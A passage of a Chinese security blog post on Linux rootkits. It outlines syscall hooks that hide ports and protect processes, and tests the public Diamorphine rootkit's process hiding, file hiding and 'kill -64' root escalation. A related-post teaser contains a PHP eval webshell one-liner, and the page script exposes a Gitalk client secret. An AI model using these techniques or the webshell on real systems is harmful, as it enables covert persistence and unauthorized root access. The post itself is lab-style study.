+<img src="image-20230616205359296.png" alt="image-20230616205359296" style="zoom:33%;" />
+
+
+
+<p>具体步骤：</p>
+<ol>
+<li>调用tcp4_seq_show()函数时拦截，转向运行hook函数</li>
+<li>判断当前处理的sock的sck_num字段是否为待隐藏端口<ol>
+<li>是则取消引用，返回0</li>
+<li>否则转交给原tcp4_seq_show()函数进行处理</li>
+</ol>
+</li>
+</ol>
+<p>ipv4下的udp端口以及ipv6下的tcp及udp端口也类似处理</p>
+<p><strong>进程保护</strong></p>
+<p>使用kill命令去终止某个PID对应的进程时，会调用sys_kill()，同时传递PID、信号等参数，因此可以hook掉sys_kill函数：</p>
+<ol>
+<li>用一个结构（链表）存储要保护的进程PID</li>
+<li>当sys_kill()被调用时进行拦截</li>
+<li>判断要kill的PID是否存在于链表中<ol>
+<li>是则返回0</li>
+<li>否则转交给原sys_kill()正常处理</li>
+</ol>
+</li>
+</ol>
+<img src="image-20230616205726202.png" alt="image-20230616205726202" style="zoom:33%;" />
+
+
+
+<h3 id="2-6-3-rootkit评估"><a href="#2-6-3-rootkit评估" class="headerlink" title="2.6.3 rootkit评估"></a>2.6.3 rootkit评估</h3><p>GitHub上的一个仓库，收集了Linux下众多各种各样的rootkit：<a target="_blank" rel="noopener" href="https://github.com/milabs/awesome-linux-rootkits">https://github.com/milabs/awesome-linux-rootkits</a></p>
+<p>包括了用户级rootkit、内核级rootkit以及相关资料等，来源于学术界最新成果或工业界成熟套件，涵盖了</p>
+<p>这里评估一个1.3K Stars的项目：<a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a></p>
+<p>是一个针对内核版本为2.6.x&#x2F;3.x&#x2F;4.x&#x2F;5.x的内核级rootkit</p>
+<p>功能特性：</p>
+<ul>
+<li>安装时即隐藏自身</li>
+<li>通过<code>kill -31 目标进程PID</code>命令隐藏目标进程</li>
+<li>通过<code>kill -64 任意进程PID</code>命令使当前用户拥有root权限</li>
+<li>将任何以{MAGIC_PREFIX}为名称前缀的文件或文件夹隐藏</li>
+</ul>
+<p>下面在64位22.04.1版本，内核版本为5.19.0-43-generic的Ubuntu系统上进行测试。</p>
+<p>首先测试进程隐藏，新建一个root shell窗口，打印进程PID为4315，通过<code>ps -aux</code>查看所有进程信息，得到三个相关进程：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616214303116.png" alt="image-20230616214303116"></p>
+<p>通过<code>kill -31 4315</code>、<code>kill -31 4314</code>、<code>kill -31 4313</code>三条命令将上述进程隐藏，再执行<code>ps -aux</code>，可以看到相关进程已经隐藏，但root shell依然存在：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616214413556.png" alt="image-20230616214413556"></p>
+<p>接着测试文件隐藏，首先创建<code>hack.php</code>文件，内容为“hello there”</p>
+<img src="image-20230616214509909.png" alt="image-20230616214509909" style="zoom:50%;" />
+
+<p>接着改变名称以{MAGIC_PREFIX}为前缀，这里的{MAGIC_PREFIX}在rootkit头文件中默认定义为“diamorphine_secret”。再次运行<code>ls</code>或<code>la</code>命令，可以看到文件已隐藏，但执行<code>cat ./diamorphine_secret_hack.php</code>，依然能够输出文件内容，说明文件依然存在：</p>
+<img src="image-20230616214543204.png" alt="image-20230616214543204" style="zoom:50%;" />
+
+<img src="image-20230616214732729.png" alt="image-20230616214732729" style="zoom:50%;" />
+
+
+
+<p>最后测试权限提升功能，直接执行<code>kill -64 1</code>，就可以将当前用户权限提升为root：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616214815670.png" alt="image-20230616214815670"></p>
+<p>还有其他已有的rootkit项目实现了其他功能，例如建立反弹shell、隐藏tcp连接等</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/Linux%E4%BC%81%E9%B9%85.png"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量">
+								Linux环境变量			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 10日, 2021				
+							</p>
+							<p class="relate-post-content">
+								前言学，以前一直没会
+以Kali Linux 2021.2为例
+资料1资料2
+概述Linux环境变量包括：系统级、用户级系统级环境变量：每个登录到系统的用户都要读取的用户级环境变量：用户使用系统时加载的
+相关命令export：设置或显...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux环境变量.png" alt="Linux环境变量"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/10/17/OWASP-Cross-Site-Request-Forgery-CSRF/" title="OWASP Cross Site Request Forgery (CSRF)">
+								OWASP Cross Site Request Forgery (CSRF)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 17日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] OWASP Cross Site Request Forgery (CSRF)前言是对OWASP针对CSRF攻击进行讲解的网站的学习笔记只记录自己感兴趣的或者是不熟的
+原文在这里
+概述
+Cross-Site Reques...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/10/17/OWASP-Cross-Site-Request-Forgery-CSRF/" title="OWASP Cross Site Request Forgery (CSRF)">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/OWASP.jpg" alt="OWASP Cross Site Request Forgery (CSRF)"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
